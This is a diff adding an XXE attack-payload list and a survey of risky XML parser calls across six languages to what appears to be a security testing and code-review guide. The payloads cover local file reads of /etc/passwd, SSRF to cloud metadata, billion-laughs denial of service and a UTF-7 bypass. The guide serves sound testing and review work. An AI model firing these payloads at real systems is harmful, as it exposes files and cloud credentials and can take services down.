@@ -30,6 +30,130 @@ The unsafe assumption is that XML input is benign structured data. Default parse
 | **Transform chains** | XSLT, XPath against untrusted docs, schema validation that loads external DTDs |
 | **Secondary parsers** | SVG metadata, Android plist, Excel/Word embedded XML parts |
 
+## Attack Payloads
+
+Use these in authorized tests when the application parses attacker-controlled XML. Confirm parser hardening before relying on file read or SSRF outcomes.
+
+### Pattern 1: Classic external entity file read
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### Pattern 2: Parameter entity (blind / filtered contexts)
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % ext SYSTEM "file:///etc/passwd">
+  %ext;
+]>
+<root></root>
+```
+
+### Pattern 3: SSRF via external entity URL
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+```
+
+### Pattern 4: Billion laughs (DoS)
+
+```xml
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>
+```
+
+### Pattern 5: XInclude file read
+
+```xml
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
+```
+
+### Pattern 6: UTF-7 / encoding bypass (legacy parsers)
+
+```xml
++ADw-!DOCTYPE foo +AFs-+AD4-
++ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for XML parser construction without secure feature flags. Default factory settings often enable DTDs and external entities.
+
+### Python
+
+```python
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=True)
+etree.parse(user_file)  # lxml defaults may resolve entities
+
+import xml.etree.ElementTree as ET
+ET.parse(upload)  # stdlib — review defusedxml usage
+
+from defusedxml import ElementTree as SafeET
+SafeET.parse(upload)  # preferred — verify project uses this
+```
+
+### Java
+
+```java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+Document doc = dbf.newDocumentBuilder().parse(inputStream);
+
+SAXParserFactory spf = SAXParserFactory.newInstance();
+spf.newSAXParser().parse(inputStream, handler);
+
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.createXMLStreamReader(reader);
+```
+
+### C#
+
+```csharp
+var doc = new XmlDocument();
+doc.LoadXml(userXml);  // XmlDocument resolves entities by default
+
+var reader = XmlReader.Create(stream);  // without DtdProcessing.Prohibit
+```
+
+### JavaScript (Node.js)
+
+```javascript
+const libxml = require('libxmljs2');
+libxml.parseXml(userXml);  // noent:true enables entities
+
+const { DOMParser } = require('@xmldom/xmldom');
+new DOMParser().parseFromString(userXml, 'text/xml');
+```
+
+### Go
+
+```go
+xml.Unmarshal(userBytes, &v)  // encoding/xml — review Decoder settings
+decoder := xml.NewDecoder(bytes.NewReader(userBytes))
+decoder.Strict = false
+```
+
+### C (libxml2)
+
+```c
+xmlReadMemory(buf, size, NULL, NULL, 0);  // default may fetch external entities
+xmlCtxtReadDoc(ctxt, buf, NULL, NULL, XML_PARSE_DTDLOAD);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
